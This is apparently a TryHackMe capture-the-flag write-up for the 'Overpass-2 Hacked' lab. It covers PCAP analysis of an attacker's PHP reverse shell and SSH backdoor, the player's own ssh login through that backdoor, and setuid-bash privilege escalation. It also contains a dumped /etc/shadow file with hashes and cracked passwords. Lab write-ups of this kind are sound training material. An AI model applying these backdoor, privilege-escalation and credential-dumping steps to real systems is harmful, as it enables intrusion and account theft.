# THM: Overpass-2 Hacked
# OS: Linux (Easy)

----

[NOTES]
- The attacker used `/development/upload.php` to upload a php reverse shell.
- Found creds (internal)
  `james:whenevernoteartinstant`
- James can run everything as sudo
- The attacker has an ssh backdoor at 0.0.0.0:2222
  `User: james`
  `Pass: november16`
  `File: /home/james/.ssh/id_rsa`
- Cracked 4/5 passwords from /etc/shadow
  secret12
  secuirty3
  1qaz2wsx
  abcd123

Usernames:
  - System:
    - james
    - paradox
    - szymex
    - muirland
    
Passwords:
  - System:
    - james:whenevernoteartinstant
    - paradox:secret12
    - szymex:secuirty3
    - bee:1qaz2wsx
    - muirland:abcd123

----

[PCAP Analysis]

- Extracted files from PCAP:
  index.html
  'upload(1).php'
  upload.php ----> Has the attackers payload
  uploads
- Found what the attacker did from his shell at pcap line 31 by following the tcp stream.
- The attacker viewed `/etc/shadow`
- The attacker installed an ssh backdoor:
  [NinjaJc01-Backdoor](https://github.com/NinjaJc01/ssh-backdoor)

----

## Foothold

- Got access by using the backdoor on port 2222
  Creds | james:november16
  `ssh -oHostKeyAlgorithms=+ssh-rsa james@$ip -p 2222`

## Privesc

- They created a `.setuid_bash` at james' home directory
  `./.setuid_bash -p`

----

[LOOT]

```/etc/shadow
james@overpass-production:~$ sudo cat /etc/shadow
sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
